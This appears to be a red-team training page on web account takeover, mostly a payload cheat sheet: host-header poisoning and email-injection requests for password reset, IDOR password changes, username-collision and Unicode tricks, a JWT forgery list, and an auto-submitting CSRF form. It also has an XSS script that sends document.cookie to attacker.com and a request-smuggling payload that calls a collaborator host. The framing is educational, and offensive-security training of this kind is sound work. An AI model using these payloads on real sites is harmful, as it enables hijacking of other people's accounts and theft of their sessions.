---
layout: training-page
title: "Account Takeover — Red Team Academy"
module: "Web Hacking"
tags:
  - account-takeover
  - password-reset
  - idor
  - csrf
  - xss
  - jwt
  - http-request-smuggling
page_key: "web-account-takeover"
render_with_liquid: false
---

# Account Takeover

Account Takeover (ATO) encompasses techniques to gain unauthorized access to another user's
  account. Attack vectors range from password reset flaws to CSRF, XSS session theft, JWT
  manipulation, HTTP request smuggling, and Unicode normalization bypasses.

## Password Reset Feature Attacks

### Password Reset Token Leak via Referrer

If the password reset link includes the token in the URL, clicking an external link from the
  reset page may leak the token in the `Referer` header to a third-party server.

1. Request a password reset for your own account
2. Click the reset link in the email
3. Do NOT change the password yet
4. Click a third-party link on the page (social media widget, external image, script)
5. Intercept in Burp and check the `Referer` header for the token

### Host Header Poisoning (Password Reset Poisoning)

Many password reset implementations generate the reset URL based on the `Host` header.
  If the server trusts user-supplied headers, the attacker can redirect the token to their own domain.

```
POST /reset-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com
Content-Type: application/json

{"email":"victim@example.com"}
```

The victim receives an email with a reset link pointing to `attacker.com`. When they
  click it, the token is sent to the attacker's server.

```
# Headers to try:
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
```

### Email Parameter Manipulation

The reset email can be duplicated or redirected by injecting additional email recipients through
  parameter pollution, arrays, or header injection.

```
# HTTP parameter pollution:
email=victim@mail.com&email=hacker@mail.com

# JSON array:
{"email":["victim@mail.com","hacker@mail.com"]}

# Carbon copy injection via URL encoding:
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# Separator variations:
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### IDOR on Password Change API

Change password endpoints often accept a user identifier (ID, email) as a parameter. Substituting
  another user's identifier changes their password.

```
POST /api/changepass HTTP/1.1
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"email":"victim@example.com","password":"NewPassword123!"}
```

### Weak Password Reset Tokens

Test whether the reset token is predictable or short. Vulnerable patterns include:

- Timestamp-based tokens (predictable within a time window)
- Tokens derived from userID + email + date of birth
- Short tokens (fewer than 6 characters in [A-Za-z0-9] — brute-forceable)
- Tokens that don't expire or can be reused
- Cryptographically weak PRNG seeded with guessable values

### Token Leakage in Server Response

```
# Trigger a password reset and inspect the API response body:
POST /api/v3/user/password/reset HTTP/1.1
{"email":"target@example.com"}

# Response might contain:
{"status":"sent","resetToken":"abc123def456"}

# Use the token directly:
GET /v3/user/password/reset?resetToken=abc123def456&email=target@example.com HTTP/1.1
```

### Username Collision Attack

Register a new account with the target's username padded with whitespace (e.g., `"admin "`).
  Request a password reset using this account. The reset token is sent to the attacker's email.
  Some systems strip whitespace when validating the username, causing the reset to apply to the
  original `"admin"` account. (CVE-2020-7245, CTFd platform)

```
# Registration:
username: "admin "   (trailing space)
email:    attacker@evil.com

# Request reset:
POST /reset {"username":"admin "}

# Token arrives at attacker@evil.com
# Set new password for "admin" (after whitespace normalization)
```

### Unicode Normalization Bypass

Some platforms normalize Unicode characters during login but not during registration. Registering
  with a Unicode lookalike email allows stealing account access.

```
# Victim account:
demo@gmail.com

# Attacker registers:
demⓞ@gmail.com   (Unicode character ⓞ U+24DE)

# If the platform normalizes ⓞ → o during login, the attacker account
# can request a reset for demo@gmail.com and authenticate as the victim
```

Tools: `github.com/tomnomnom/hacks/tree/master/unisub` (suggest Unicode homoglyphs),
  `gosecure.github.io/unicode-pentester-cheatsheet/`

## Account Takeover via Web Vulnerabilities

### Via Cross-Site Scripting (XSS)

1. Find XSS in the target application or any subdomain sharing the cookie scope (`*.domain.com`)
2. Use the XSS to exfiltrate the victim's session cookie
3. Authenticate with the stolen cookie

```
# Session cookie theft payload:
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie, {mode:'no-cors'});
</script>
```

### Via HTTP Request Smuggling

HTTP Request Smuggling can be used to capture another user's request (including their
  Authorization or Cookie headers) by smuggling a partial request that prepends to the next
  victim's legitimate request.

```
# Step 1: find CL.TE or TE.CL desync with smuggler tool
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com

# Step 2: smuggle a request that captures the next user's headers
GET / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 83

0

GET http://attacker.burpcollaborator.net HTTP/1.1
X: X
```

### Via CSRF

```
<!-- Auto-submitting CSRF form to change victim's email -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
</body>
</html>
```

### Via JWT Manipulation

```
# Decode the JWT (base64):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOjEyMywiZW1haWwiOiJ1c2VyQGV4YW1wbGUuY29tIn0...

# Modify claims:
{"userid":1,"email":"admin@example.com"}

# Attacks:
# 1. Change alg to "none" and strip signature
# 2. Use a weak/empty secret for HMAC signing
# 3. Confusion: if RS256, try using the public key as HS256 secret
# 4. Modify sub/user_id/email claim to target user
```

## Resources

- PayloadsAllTheThings Account Takeover — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover`
- 10 Password Reset Flaws — Anugrah SR
- CVE-2020-7245 — CTFd username collision — `nvd.nist.gov/vuln/detail/CVE-2020-7245`
- Hacking Grindr Accounts with Copy and Paste — Troy Hunt (Unicode normalization)
- smuggler tool — `github.com/defparam/smuggler`
- HackerOne #737140 — HTTP Request Smuggling ATO on Slack
- Unicode Pentester Cheatsheet — `gosecure.github.io/unicode-pentester-cheatsheet/`
- unisub tool — `github.com/tomnomnom/hacks/tree/master/unisub`
